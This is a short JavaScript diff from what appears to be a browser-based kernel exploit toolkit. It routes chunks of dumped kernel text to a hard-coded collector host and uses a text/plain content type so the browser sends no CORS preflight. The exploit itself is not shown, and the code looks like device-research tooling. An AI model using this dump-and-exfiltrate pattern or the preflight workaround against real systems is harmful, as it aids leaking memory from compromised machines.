@@ -5,14 +5,23 @@
 const CHUNK = 0x1000;
 const DUMP_SIZE = 4 * 1024 * 1024; // first 4MB of kernel text; raise after review
 
+// Dumps land on the Mac collector when the page is served from elsewhere
+// (cluster NodePort); text/plain keeps the POST preflight-free.
+function collectorBase() {
+  return typeof location !== "undefined" &&
+    location.origin.startsWith("http://192.168.10.210")
+    ? ""
+    : "http://192.168.10.210:8079";
+}
+
 function nameFor(kbase) {
   return "ktext_1360_0x" + kbase.toString(16) + ".bin";
 }
 
 async function postChunk(name, bytes) {
-  await fetch("/dump/" + name, {
+  await fetch(collectorBase() + "/dump/" + name, {
     method: "POST",
-    headers: { "Content-Type": "application/octet-stream" },
+    headers: { "Content-Type": "text/plain" },
     body: bytes,
   });
 }
